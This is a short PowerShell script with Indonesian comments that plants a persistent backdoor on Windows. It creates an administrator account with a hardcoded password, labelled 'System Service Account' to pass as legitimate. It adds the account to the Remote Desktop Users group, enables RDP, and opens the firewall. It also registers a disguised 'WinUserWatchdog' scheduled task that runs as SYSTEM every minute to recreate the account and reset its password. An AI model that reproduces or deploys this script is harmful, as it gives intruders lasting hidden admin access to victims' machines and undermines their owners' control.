# ================= CONFIG =================
$Username = "default"
$PlainPassword = "Farel34153431!"   # GANTI SESUKA LO (WAJIB KUAT)
$TaskName = "WinUserWatchdog"
# =========================================

function Ensure-User {

    $SecurePassword = ConvertTo-SecureString $PlainPassword -AsPlainText -Force

    if (-not (Get-LocalUser -Name $Username -ErrorAction SilentlyContinue)) {

        # Create user
        New-LocalUser `
            -Name $Username `
            -Password $SecurePassword `
            -FullName "System Service Account" `
            -Description "Auto-created SYSTEM user" `
            -PasswordNeverExpires `
            -AccountNeverExpires

        # Groups
        Add-LocalGroupMember -Group "Administrators" -Member $Username
        Add-LocalGroupMember -Group "Remote Desktop Users" -Member $Username
    }

    # Force password tetap sesuai script (kalau diubah manual)
    Set-LocalUser -Name $Username -Password $SecurePassword

    # Enable RDP
    Set-ItemProperty `
      -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
      -Name "fDenyTSConnections" -Value 0

    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
}

# ================= RUN =================
Ensure-User

# =========== INSTALL WATCHDOG ===========
if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {

    $action = New-ScheduledTaskAction `
        -Execute "powershell.exe" `
        -Argument "-ExecutionPolicy Bypass -File `"$PSCommandPath`""

    $triggerBoot = New-ScheduledTaskTrigger -AtStartup
    $triggerLoop = New-ScheduledTaskTrigger `
        -Once -At (Get-Date) `
        -RepetitionInterval (New-TimeSpan -Minutes 1)

    Register-ScheduledTask `
        -TaskName $TaskName `
        -Action $action `
        -Trigger @($triggerBoot, $triggerLoop) `
        -User "SYSTEM" `
        -RunLevel Highest `
        -Force | Out-Null
}
